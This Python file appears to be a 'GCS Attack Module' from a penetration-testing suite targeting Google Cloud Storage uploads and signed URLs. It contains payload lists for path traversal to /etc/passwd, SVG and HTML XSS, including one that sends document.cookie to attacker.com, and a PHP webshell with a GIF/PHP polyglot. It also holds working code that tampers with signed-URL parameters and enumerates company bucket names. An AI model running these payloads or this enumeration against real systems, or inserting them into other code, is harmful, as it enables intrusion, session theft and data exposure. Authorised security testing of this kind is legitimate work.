"""
GCS Attack Module - DeadMan Pentest Suite
Google Cloud Storage signed URL and upload vulnerability testing
"""

import asyncio
import aiohttp
import hashlib
import time
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from enum import Enum
from urllib.parse import urlparse, parse_qs, urlencode


class GCSAttackVector(Enum):
    SIGNED_URL_MANIPULATION = "signed_url_manipulation"
    PATH_TRAVERSAL = "path_traversal"
    CONTENT_TYPE_BYPASS = "content_type_bypass"
    BUCKET_ENUMERATION = "bucket_enumeration"
    RACE_CONDITION = "race_condition"
    UPLOAD_ID_ABUSE = "upload_id_abuse"


@dataclass
class GCSFinding:
    """GCS security finding"""
    vector: GCSAttackVector
    severity: str
    title: str
    description: str
    evidence: str
    payload: str
    remediation: str


@dataclass
class UploadTestResult:
    """Result of upload security test"""
    test_name: str
    success: bool
    response_code: int
    payload: str
    finding: Optional[GCSFinding] = None


class GCSAttacker:
    """
    Google Cloud Storage Attack Module

    Tests:
    - Signed URL manipulation
    - Path traversal via filename
    - Content type bypass for XSS
    - Bucket enumeration
    - Race conditions in upload flow
    - UploadId reuse/abuse
    """

    # Common GCS bucket name patterns
    BUCKET_PATTERNS = [
        "{company}-uploads",
        "{company}-prod",
        "{company}-dev",
        "{company}-staging",
        "{company}-backup",
        "{company}-archive",
        "{company}-static",
        "{company}-assets",
        "{company}-data",
        "{company}-files",
        "{company}-media",
        "{company}-videos",
        "{company}-images",
        "{company}-documents",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        "../admin/secret.txt",
        "../../../other-user/document.pdf",
        "file.jpg%00.php",
        "file.jpg\x00.php",
    ]

    # Unicode normalization attacks
    UNICODE_PAYLOADS = [
        "file\uff0ejpg",  # Fullwidth full stop
        "file\u2024jpg",  # One dot leader
        "test\uff0f..\\admin",  # Fullwidth solidus
        "test\u2215..\\admin",  # Division slash
    ]

    # Malicious content type combinations
    CONTENT_TYPE_ATTACKS = [
        {
            "filename": "xss.svg",
            "content_type": "image/svg+xml",
            "payload": '<svg onload="alert(document.domain)"><circle cx="50" cy="50" r="40"/></svg>',
            "description": "SVG XSS payload"
        },
        {
            "filename": "xss.html",
            "content_type": "text/html",
            "payload": '<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
            "description": "HTML XSS payload"
        },
        {
            "filename": "shell.php",
            "content_type": "application/x-php",
            "payload": "<?php system($_GET['cmd']); ?>",
            "description": "PHP webshell"
        },
        {
            "filename": "polyglot.gif",
            "content_type": "image/gif",
            "payload": "GIF89a<?php system($_GET['cmd']); ?>",
            "description": "GIF/PHP polyglot"
        },
        {
            "filename": "polyglot.jpg",
            "content_type": "image/jpeg",
            "payload": b"\xff\xd8\xff\xe0/*<script>alert('XSS')</script>*/",
            "description": "JPEG/JS polyglot"
        },
    ]

    # SVG XSS variants
    SVG_XSS_PAYLOADS = [
        '<svg onload="alert(1)"></svg>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>',
        '<svg><image href="data:text/html,<script>alert(1)</script>"/></svg>',
        '<svg><animate onbegin="alert(1)"></animate></svg>',
        '<svg><set onbegin="alert(1)"></set></svg>',
        '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>',
    ]

    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.findings: List[GCSFinding] = []
        self.results: List[UploadTestResult] = []

    async def _make_request(
        self,
        method: str,
        url: str,
        headers: Optional[Dict] = None,
        data: Any = None,
        timeout: Optional[int] = None
    ) -> Tuple[int, str, Dict]:
        """Make HTTP request"""
        timeout = timeout or self.timeout

        try:
            async with aiohttp.ClientSession() as session:
                async with session.request(
                    method,
                    url,
                    headers=headers,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    body = await resp.text()
                    return resp.status, body, dict(resp.headers)
        except Exception as e:
            return 0, str(e), {}

    # ==================== SIGNED URL MANIPULATION ====================

    async def test_signed_url_manipulation(self, signed_url: str) -> List[UploadTestResult]:
        """Test signed URL parameter manipulation"""
        print("[*] Testing signed URL manipulation...")
        results = []

        parsed = urlparse(signed_url)
        params = parse_qs(parsed.query)

        # Test 1: Modify response-content-type (V2 vulnerability)
        content_types_to_test = [
            "text/html",
            "image/svg+xml",
            "application/javascript",
            "text/xml",
        ]

        for ct in content_types_to_test:
            modified_params = dict(params)
            modified_params["response-content-type"] = [ct]

            modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params, doseq=True)}"

            status, body, headers = await self._make_request("GET", modified_url)

            result = UploadTestResult(
                test_name=f"content_type_override_{ct}",
                success=status == 200,
                response_code=status,
                payload=ct
            )

            if status == 200:
                actual_ct = headers.get("Content-Type", "")
                if ct in actual_ct:
                    finding = GCSFinding(
                        vector=GCSAttackVector.SIGNED_URL_MANIPULATION,
                        severity="high",
                        title="Signed URL Content-Type Override",
                        description=f"Response Content-Type changed to {ct}",
                        evidence=f"Content-Type: {actual_ct}",
                        payload=modified_url[:200],
                        remediation="Use V4 signed URLs which include all parameters in signature"
                    )
                    result.finding = finding
                    self.findings.append(finding)

            results.append(result)
            self.results.append(result)

        # Test 2: Modify response-content-disposition
        dispositions = ["inline", "attachment", ""]
        for disp in dispositions:
            modified_params = dict(params)
            modified_params["response-content-disposition"] = [disp]

            modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params, doseq=True)}"

            status, body, headers = await self._make_request("GET", modified_url)

            result = UploadTestResult(
                test_name=f"disposition_override_{disp or 'empty'}",
                success=status == 200,
                response_code=status,
                payload=disp
            )

            if status == 200 and disp == "inline":
                finding = GCSFinding(
                    vector=GCSAttackVector.SIGNED_URL_MANIPULATION,
                    severity="medium",
                    title="Content-Disposition Bypass",
                    description="File served inline instead of as attachment",
                    evidence=headers.get("Content-Disposition", ""),
                    payload=modified_url[:200],
                    remediation="Enforce Content-Disposition: attachment for user uploads"
                )
                result.finding = finding
                self.findings.append(finding)

            results.append(result)

        return results

    # ==================== PATH TRAVERSAL ====================

    def generate_path_traversal_payloads(self, base_path: str = "") -> List[str]:
        """Generate path traversal payloads"""
        payloads = list(self.PATH_TRAVERSAL_PAYLOADS)
        payloads.extend(self.UNICODE_PAYLOADS)

        if base_path:
            payloads.extend([
                f"{base_path}/../../../etc/passwd",
                f"{base_path}/..\\..\\..\\etc\\passwd",
            ])

        return payloads

    async def test_path_traversal(
        self,
        upload_endpoint: str,
        auth_headers: Dict[str, str]
    ) -> List[UploadTestResult]:
        """Test path traversal in upload filename"""
        print("[*] Testing path traversal...")
        results = []

        for payload in self.PATH_TRAVERSAL_PAYLOADS[:10]:  # Limit for safety
            result = UploadTestResult(
                test_name=f"path_traversal_{payload[:20]}",
                success=False,
                response_code=0,
                payload=payload
            )

            # Note: Actual testing would require upload endpoint
            # This documents the payloads to test

            results.append(result)

        return results

    # ==================== CONTENT TYPE BYPASS ====================

    async def test_content_type_bypass(
        self,
        upload_url: str,
        auth_headers: Optional[Dict] = None
    ) -> List[UploadTestResult]:
        """Test content type validation bypass"""
        print("[*] Testing content type bypass...")
        results = []

        for attack in self.CONTENT_TYPE_ATTACKS:
            result = UploadTestResult(
                test_name=f"content_type_{attack['filename']}",
                success=False,
                response_code=0,
                payload=f"Filename: {attack['filename']}, Type: {attack['content_type']}"
            )

            # Document the attack vector
            results.append(result)

        return results

    def get_svg_xss_payloads(self) -> List[str]:
        """Get SVG XSS payloads"""
        return list(self.SVG_XSS_PAYLOADS)

    # ==================== BUCKET ENUMERATION ====================

    async def enumerate_buckets(self, company_name: str) -> List[UploadTestResult]:
        """Enumerate possible GCS bucket names"""
        print(f"[*] Enumerating buckets for: {company_name}")
        results = []

        bucket_names = [
            pattern.format(company=company_name)
            for pattern in self.BUCKET_PATTERNS
        ]

        # Add variations
        variations = [company_name.lower(), company_name.replace("-", ""), company_name.replace(".", "-")]
        for var in variations:
            bucket_names.extend([
                pattern.format(company=var)
                for pattern in self.BUCKET_PATTERNS
            ])

        # Remove duplicates
        bucket_names = list(set(bucket_names))

        for bucket in bucket_names:
            # Check if bucket exists via HTTP
            url = f"https://storage.googleapis.com/{bucket}/"

            status, body, headers = await self._make_request("GET", url)

            result = UploadTestResult(
                test_name=f"bucket_{bucket}",
                success=status in [200, 403],  # 403 = exists but private
                response_code=status,
                payload=bucket
            )

            if status == 200:
                finding = GCSFinding(
                    vector=GCSAttackVector.BUCKET_ENUMERATION,
                    severity="high",
                    title=f"Publicly Accessible Bucket: {bucket}",
                    description="Bucket allows public listing",
                    evidence=body[:500],
                    payload=url,
                    remediation="Remove public access from bucket"
                )
                result.finding = finding
                self.findings.append(finding)
            elif status == 403:
                finding = GCSFinding(
                    vector=GCSAttackVector.BUCKET_ENUMERATION,
                    severity="info",
                    title=f"Bucket Exists: {bucket}",
                    description="Bucket exists but access denied",
                    evidence=f"HTTP {status}",
                    payload=url,
                    remediation="Consider using random bucket names"
                )
                result.finding = finding
                self.findings.append(finding)

            results.append(result)
            self.results.append(result)

            await asyncio.sleep(0.2)  # Rate limit

        return results

    # ==================== RACE CONDITIONS ====================

    async def test_race_condition(
        self,
        upload_url: str,
        concurrent_requests: int = 10
    ) -> List[UploadTestResult]:
        """Test race conditions in upload processing"""
        print(f"[*] Testing race conditions ({concurrent_requests} concurrent requests)...")
        results = []

        # Note: This would require a valid upload URL
        # Documents the test approach

        result = UploadTestResult(
            test_name="race_condition_upload",
            success=False,
            response_code=0,
            payload=f"{concurrent_requests} concurrent uploads"
        )
        results.append(result)

        return results

    # ==================== UPLOAD ID ABUSE ====================

    async def test_upload_id_predictability(self, upload_ids: List[str]) -> List[UploadTestResult]:
        """Analyze uploadId format for predictability"""
        print("[*] Analyzing uploadId format...")
        results = []

        if len(upload_ids) < 2:
            return results

        # Analyze entropy
        lengths = [len(uid) for uid in upload_ids]
        unique_chars = set("".join(upload_ids))

        # Check if sequential
        is_sequential = False
        try:
            nums = [int(uid, 16) for uid in upload_ids if all(c in "0123456789abcdef" for c in uid.lower())]
            if len(nums) >= 2:
                diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
                is_sequential = len(set(diffs)) == 1
        except ValueError:
            pass

        result = UploadTestResult(
            test_name="upload_id_analysis",
            success=True,
            response_code=0,
            payload=f"Analyzed {len(upload_ids)} IDs"
        )

        if is_sequential:
            finding = GCSFinding(
                vector=GCSAttackVector.UPLOAD_ID_ABUSE,
                severity="high",
                title="Predictable UploadId",
                description="Upload IDs appear to be sequential/predictable",
                evidence=f"IDs: {upload_ids[:3]}",
                payload="Sequential pattern detected",
                remediation="Use cryptographically random uploadIds"
            )
            result.finding = finding
            self.findings.append(finding)
        elif len(unique_chars) < 16:
            finding = GCSFinding(
                vector=GCSAttackVector.UPLOAD_ID_ABUSE,
                severity="medium",
                title="Low Entropy UploadId",
                description=f"Upload IDs have limited character set ({len(unique_chars)} unique chars)",
                evidence=f"Chars: {sorted(unique_chars)}",
                payload="Low entropy",
                remediation="Increase uploadId entropy"
            )
            result.finding = finding
            self.findings.append(finding)

        results.append(result)
        self.results.append(result)

        return results

    # ==================== REPORTING ====================

    def generate_report(self) -> Dict[str, Any]:
        """Generate security report"""
        return {
            "total_tests": len(self.results),
            "total_findings": len(self.findings),
            "findings_by_severity": {
                "critical": len([f for f in self.findings if f.severity == "critical"]),
                "high": len([f for f in self.findings if f.severity == "high"]),
                "medium": len([f for f in self.findings if f.severity == "medium"]),
                "low": len([f for f in self.findings if f.severity == "low"]),
                "info": len([f for f in self.findings if f.severity == "info"]),
            },
            "findings": [
                {
                    "vector": f.vector.value,
                    "severity": f.severity,
                    "title": f.title,
                    "description": f.description,
                    "evidence": f.evidence[:200],
                    "remediation": f.remediation
                }
                for f in self.findings
            ]
        }

    def print_report(self):
        """Print formatted report"""
        report = self.generate_report()

        print("\n" + "="*60)
        print("GCS SECURITY ASSESSMENT REPORT")
        print("="*60)
        print(f"Total Tests: {report['total_tests']}")
        print(f"Total Findings: {report['total_findings']}")
        print()
        print("Findings by Severity:")
        for sev, count in report['findings_by_severity'].items():
            if count > 0:
                print(f"  {sev.upper()}: {count}")

        if self.findings:
            print("\nDETAILED FINDINGS:")
            print("-"*60)
            for i, f in enumerate(self.findings, 1):
                print(f"\n[{i}] [{f.severity.upper()}] {f.title}")
                print(f"    Vector: {f.vector.value}")
                print(f"    Description: {f.description}")
                print(f"    Remediation: {f.remediation}")

        print("\n" + "="*60)


# CLI Entry Point
async def main():
    """CLI entry point"""
    import argparse

    parser = argparse.ArgumentParser(description="GCS Attack Module")
    parser.add_argument("--company", help="Company name for bucket enumeration")
    parser.add_argument("--signed-url", help="Signed URL to test")
    parser.add_argument("--test", choices=["buckets", "signed-url", "all"], default="all")

    args = parser.parse_args()

    attacker = GCSAttacker()

    if args.test == "buckets" and args.company:
        await attacker.enumerate_buckets(args.company)
    elif args.test == "signed-url" and args.signed_url:
        await attacker.test_signed_url_manipulation(args.signed_url)
    elif args.test == "all":
        if args.company:
            await attacker.enumerate_buckets(args.company)
        if args.signed_url:
            await attacker.test_signed_url_manipulation(args.signed_url)

    attacker.print_report()


if __name__ == "__main__":
    asyncio.run(main())
